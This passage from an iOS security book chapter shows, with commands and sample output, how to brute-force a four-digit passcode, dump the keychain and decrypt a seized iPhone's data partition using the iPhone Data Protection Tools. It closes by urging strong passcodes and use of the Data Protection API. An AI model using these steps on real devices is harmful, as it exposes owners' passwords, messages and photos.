Forwarding local port 1999 to remote port 1999
[ ... ]
Figure 3.2: If you need instructions on how to put the device into DFU mode, click
the Next button to have redsn0w guide you through the process.
Many of the included Python scripts depend on being able to access the target
device over SSH, so you should keep tcprelay.sh running in another Terminal
tab or window while you are acquiring data from the device.
Brute-Force Attacking Four-Digit Passcodes
To decrypt protected items in the keychain or on the fi lesystem, you will need to
recover and decrypt the system keybag. If there is no passcode set, this keybag
can be trivially decrypted. If the user has set a simple four-digit passcode, it will
have to be guessed. The included demo_bruteforce.py Python script can perform
this attack and guess any four-digit passcode within roughly 20 minutes. You will
cc0033..iinndddd 6622 44//1166//22001122 55::4433::1144 PPMM
Chapter 3 n Encryption 63
need to run this script from your desktop, which will SSH into the iOS device,
retrieve, and decrypt the system keybag, before you are able to dump the keychain.
$ python python_scripts/demo_bruteforce.py
Device UDID : e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a
Keybag: SIGN check OK
Keybag UUID : 11d1928f9a1f491fb87fb9991b1c3ec6
Saving /Users/admin/Desktop/iphone-
dataprotection/e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.
plist
passcodeKeyboardComplexity : {‘rangeMinimum’: 0, ‘value’: 0,
‘rangeMaximum’: 2}
Trying all 4-digits passcodes...
BruteforceSystemKeyBag : 0:03:41.735334
{‘passcode’: ‘1234’, ‘passcodeKey’:
‘497ea264862390cc13a9eebc118f7ec65c80192787c6b3259b88c62331572ed4’}
True
Keybag type : System keybag (0)
Keybag version : 3
Class WRAP Type Key
1 3 0
f2680d6bcdde71a1fae1c3a538e7bbe0f0495e7f75831959f10a41497675f490
2 3 1
01133605e634ecfa168a3371351f36297e2ce599768204fd5073f8c9534c2472
3 3 0
cbd0a8627ad15b025a0b1e3e804cc61df85844cadb01720a2f282ce268e9922e
5 3 0
75a657a13941c98804cb43e395a8aebe92e345eaa9bc93dbe1563465b118e191
6 3 0
e0e4e1396f7eb7122877e7c307c65221029721f1d99f855c92b4cd2ed5a9adb1
7 3 0
a40677ed8dff8837c077496b7058991cc1200e8e04576b60505baff90c77be30
8 1 0
2d058bf0800a12470f65004fecaefaf86fbdfdb3d23a4c900897917697173f4c
9 3 0
098640c771d020cc1756c73ae87e686e5c170f794987d217eeca1616d0e9028d
10 3 0
661a4670023b754853aa059a79d60dbb77fc3e3711e5a1bd890f218c33e7f64c
11 1 0
669964beb0195dfa7207f6a976bf6849c0886de12bea73461e93fa274ff196a4
Saving /Users/admin/Desktop/iphone-dataprotection/
e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
Downloaded keychain database, use keychain_tool.py to decrypt secrets
If the passcode was not set or it was guessed, the system keybag and keychain
database will have been downloaded into a directory named with the UDID
of the target device.
cc0033..iinndddd 6633 44//1166//22001122 55::4433::1144 PPMM
64 Chapter 3 n Encryption
Dumping Keychain
Now that you have recovered the system keybag and backup keychain, you
can decrypt the keychain using the keychain_tool.py script. This script takes
several options and requires the paths to the backup keychain and the system
keybag as saved by demo_bruteforce.py. For example, the –d and –s options
are used to dump the keychain entries and sanitize the passwords. You can see
an example of its output here:
$ python python_scripts/keychain_tool.py \
–ds e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/keychain-2.db \
e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
Keybag: SIGN check OK
Keybag unlocked with passcode key
Keychain version : 5
------------------------------------------------------------
Passwords
------------------------------------------------------------
Service : AirPort
Account : MyHomeNetwork
Password : ab******
Agrp : apple
------------------------------------------------------------
Service : com.apple.managedconfi guration
Account : Private
Password : 
Agrp : apple
------------------------------------------------------------
Service : com.apple.certui
Account : https: simba.local - 446c9ccd 6ef09252 f3b4e55d 4df16dd3 [...]
Password : 
Agrp : com.apple.cfnetwork
------------------------------------------------------------
Service : com.apple.certui
Account : https: simba.local - 46c14e20 b83a2cef 86340d38 0720f560 [...]
Password : 
Agrp : com.apple.cfnetwork
------------------------------------------------------------
Service : push.apple.com
Account :
Password : |
00000010 6e 99 eb 3c 9f 41 fa c7 91 c4 10 d6 b2 2f 21 b2 |n..<.A......./!.|
00000020 39 87 12 39 6d 5c 96 7d 4a bd a1 4a ea 49 ba 40 |9..9m\.}J..J.I.@|
00000030 96 53 c4 d3 81 0d 6e 73 98 6c 91 11 db e0 c2 3d |.S....ns.l.....=|
00000040 7a 17 82 35 18 59 fb 17 1a b2 51 89 fc 8b 55 5a |z..5.Y....Q...UZ|
00000050 95 04 a0 d6 2d d5 6a 6c e8 ad 65 df ea b4 a8 8b |....-.jl..e.....|
00000060 7e de c1 d2 b2 8a 30 e9 84 bb 08 9a 58 9a ad ba |~.....0.....X...|
00000070 bb ba b1 9e 2a 95 67 d7 be a1 4b a7 de 41 05 56 |....*.g...K..A.V|
00000080 d5 4e 8b d6 3b 57 45 d2 76 4e 67 c0 8b 10 45 d9 |.N..;WE.vNg...E.|
00000090 7b 2a c3 c9 11 f4 c5 f0 56 84 86 b7 46 fe 56 e8 |{*......V...F.V.|
When an iOS disk image is mounted on Mac OS X, you can browse the
fi lesystem and examine all the fi le meta data. All fi le contents, however, will be
unreadable encrypted data. This is because even fi les that are protected with
NSFileProtectionNone are encrypted. To read any fi le data, the fi le contents
must be decrypted using the keys in the system keybag. In the previous com-
mands, the sms.db fi le is unreadable data, even though it is protected with
NSFileProtectionNone.
Decrypting Data Partition
To decrypt the fi le data, the iPhone Data Protection Tools include a script called
emf_decrypter.py. This script uses the raw image of the data partition and
the decrypted system keybag to decrypt all of the encrypted fi les on the fi le-
system. Because it requires access to the keybag, make sure that you have run
demo_bruteforce.py already to guess the user’s passcode and decrypt the
system keybag. You should run the emf_decrypter.py script shown here (note
that the directory and fi lenames will likely be different because they are based
on unique characteristics of the target device):
$ python python_scripts/emf_decrypter.py \
e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/data_20120222-1450.dmg \
cc0033..iinndddd 6666 44//1166//22001122 55::4433::1144 PPMM
Chapter 3 n Encryption 67
e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/9dd7912fb6f996e9.plist
Keybag: SIGN check OK
Keybag unlocked with passcode key
cprotect version : 4
WARNING ! This tool will modify the hfs image and possibly wreck it if
something goes wrong !
Make sure to backup the image before proceeding
You can use the --nowrite option to do a dry run instead
Press a key to continue or CTRL-C to abort
Decrypting TrustStore.sqlite3
Decrypting keychain-2.db
[ ... ]
Decrypted 398 files
Failed to unwrap keys for : []
Not encrypted files : 19
If there were no errors, the script will have modifi ed the disk image directly,
so that all fi le contents are now decrypted and readable. To verify this, you can
mount the disk image again and examine the SMS database, which was previ-
ously unreadable:
$ hdiutil attach -readonly \
e8a27a5ee1eacdcb29ed683186ef5b2393c59e5a/data_20120222-1450.dmg
/dev/disk6 /Volumes/Data
$ cd /Volumes/Data/
$ fi le mobile/Library/SMS/sms.db
mobile/Library/SMS/sms.db: SQLite 3.x database
$ hexdump -C mobile/Library/SMS/sms.db | head
00000000 53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00 |SQLite format 3.|
00000010 10 00 02 02 00 40 20 20 00 00 00 02 00 00 00 01 |.....@ ........|
00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00000030 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 |................|
00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 |................|
00000060 00 2d e2 1f 0d 00 00 00 00 10 00 00 00 00 00 00 |.-..............|
00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
*
00001000
Now, you should be able to fully examine the data on the data partition. This
shows how easily recoverable all of the data on an iOS device is if the user uses
only a four-digit passcode or no passcode at all. If the user chooses a strong
passcode, only the fi les protected with NSFileProtectionNone and keychain
items protected by kSecAttrAccessibleAlways will be accessible. Fortunately
for attackers, this is the vast majority of fi les and keychain items on the device,
because very few iOS applications (even the built-in applications) make use of
the Data Protection API.
It is important to keep in mind that these attacks require only brief access to
the target device. For example, acquiring a full forensic image of an 8GB data
cc0033..iinndddd 6677 44//1166//22001122 55::4433::1144 PPMM
68 Chapter 3 n Encryption
partition and attempting to brute force the four-digit passcode can be performed
in roughly half an hour. Even if the passcode has not been guessed, a wealth of
data (including photos, text messages, and third-party application data) can be
read from the device because they are encrypted using the NSFileProtectionNone
class key, which is not protected by the passcode key. Of the applications built
into iOS, only Mail employs the Data Protection API to protect its data (the
user’s e-mail messages and attachments). Assessing how securely a particular
third-party application stores sensitive user information requires a skilled mobile
security application auditor, and this information is rarely made available by
the application developers.
Summary
The primary facility for encrypting sensitive user data in iOS is the Data Protection
API. Introduced in iOS 4, the Data Protection API allows applications to declare
which fi les and items in the keychain are sensitive and when the application
needs them to be available. This allows the operating system to fully manage
the encryption and decryption of this data automatically. The data protected
by the Data Protection API is encrypted using keys derived from a unique
device-specifi c AES key, and optionally, the user’s passcode to require that
attackers have both access to the physical device and know or guess the user’s
passcode in order to decrypt the data.
The attacks against data protection make use of the fact that the default simple
four-digit passcodes are easy to discover using brute force and that the vast
majority of data stored by iOS is not currently protected by the Data Protection
API. In particular, of the built-in applications, only Mail currently uses the Data
Protection API to protect its data. An attacker may jailbreak a captured device
and install custom tools to brute force the owner’s passcode. Alternatively, the
attacker may boot from a custom ramdisk to perform this same attack. Booting
a custom ramdisk also facilitates full forensic data acquisition, as shown by
the open source iPhone Data Protection Tools. In addition, because iOS saves
application state across reboots, users may not notice that their phone has been
rebooted and attacked using a custom ramdisk while it has been briefl y out of
their possession.
These attacks against data protection show the importance of application
developers making full use of the Data Protection API and enterprises enforc-
ing strong passcode requirements on iOS devices that may hold or process
sensitive data.
cc0033..iinndddd 6688 44//1166//22001122 55::4433::1144 PPMM